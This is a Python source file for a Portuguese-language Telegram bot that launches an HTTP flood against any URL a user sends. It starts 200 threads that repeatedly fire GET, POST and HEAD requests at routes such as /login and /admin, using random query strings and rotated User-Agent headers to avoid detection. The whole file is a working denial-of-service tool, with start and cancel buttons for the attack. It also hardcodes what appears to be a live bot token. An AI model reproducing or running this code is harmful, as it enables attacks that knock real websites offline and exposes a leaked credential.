
import threading
import random
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

TOKEN = "8061748013:AAHpn45TB5Z2QbkVC6o-WhqjyXg2R7-BRt8"

alvo = ""
ataque_ativo = False
threads = []
lock = threading.Lock()
contador = 0

rotas = ["/", "/login", "/admin", "/search", "/panel", "/api", "/dashboard"]
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (Linux; Android 10)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"
]

def gerar_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def disparar_requisicoes():
    global contador
    while ataque_ativo:
        for _ in range(10):
            try:
                rota = random.choice(rotas)
                url = alvo + rota + "?q=" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=8))
                headers = gerar_headers()
                requests.get(url, headers=headers, timeout=1)
                requests.post(url, headers=headers, data={"x": "A" * 500}, timeout=1)
                requests.head(url, headers=headers, timeout=1)
                with lock:
                    contador += 3
                    print(f"Enviando req para {alvo}", end="\r")
            except Exception as e:
                print(f"Erro na requisição: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Iniciar ataque", callback_data="iniciar")],
        [InlineKeyboardButton("Cancelar ataque", callback_data="cancelar")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Escolha uma ação:", reply_markup=reply_markup)

async def botao_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ataque_ativo
    query = update.callback_query
    await query.answer()
    if query.data == "iniciar":
        await query.edit_message_text("Envie a URL do alvo:")
    elif query.data == "cancelar":
        ataque_ativo = False
        await query.edit_message_text("Ataque cancelado.")

async def receber_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alvo, ataque_ativo, threads, contador

    if ataque_ativo:
        return

    text = update.message.text.strip()
    if not text.startswith("http"):
        await update.message.reply_text("URL inválida.")
        return

    alvo = text
    ataque_ativo = True
    contador = 0
    threads = []

    for _ in range(200):
        t = threading.Thread(target=disparar_requisicoes)
        t.daemon = True
        t.start()
        threads.append(t)

    keyboard = [[InlineKeyboardButton("Cancelar ataque", callback_data="cancelar")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Ataque iniciado:\n{alvo}", reply_markup=reply_markup)

async def parar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global ataque_ativo
    ataque_ativo = False
    await update.message.reply_text("Ataque parado.")

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(botao_callback))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), receber_url))
    app.add_handler(CommandHandler("parar", parar))
    
    print("Bot iniciado...")
    app.run_polling()
